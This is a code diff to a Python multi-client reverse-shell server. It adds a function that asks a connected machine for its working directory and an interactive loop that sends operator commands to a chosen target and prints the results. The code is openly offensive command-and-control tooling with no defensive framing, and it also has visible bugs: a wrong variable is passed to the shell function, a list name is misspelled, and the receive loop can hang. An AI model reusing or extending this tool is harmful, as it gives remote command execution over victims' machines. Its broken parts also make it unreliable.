@@ -12,6 +12,10 @@ NUMBER_OF_THREADS = 4
 
 send = lambda a, b : a.send(b.encode())
 
+def getdir(conn) :
+    send(conn, 'cwd')
+    return conn.recv(4097).decode()
+
 def send_to(q, cmd) :
     while True :
         conn = q.get()
@@ -47,6 +51,17 @@ def bind_socket() :
 
 """ Accept incomming connections """
 def accept_connections() :
+    global connections_list 
+    global address_list
+
+    for conn in connections_list :
+        conn.close()
+
+    del connections_list
+    del address_list
+    connections_list = list()
+    adddress_list = list()
+
     while True :
         conn, addr = objSocket.accept()
         connections_list.append(conn)
@@ -60,6 +75,22 @@ def send_to_all(cmd) :
 
     senders(q, cmd)
     q.join()
+
+""" Start reverse shell to just """
+def shell_to_target(conn) :
+    while True :
+        dirc = getdir(conn)
+        cmd = input(f'\n{dirc} $ ')
+
+        if cmd == 'exit' :
+            break
+        else :
+            send(conn, cmd)
+            data_back = conn.recv(4049)
+
+            while len(data_back) > 0: 
+                print(data_back.decode())
+                data_back = conn.recv(4049)
 
 """ Start the reverse shell """
 def start_shell() :
@@ -92,7 +123,8 @@ def start_shell() :
                 target = connections_list[n - 1]
                 addr = address_list[n - 1]
                 print(f'Connection to {addr}')
-
+                shell_to_target(conn)
+                
 
         elif choise == 'q':
             sys.exit()
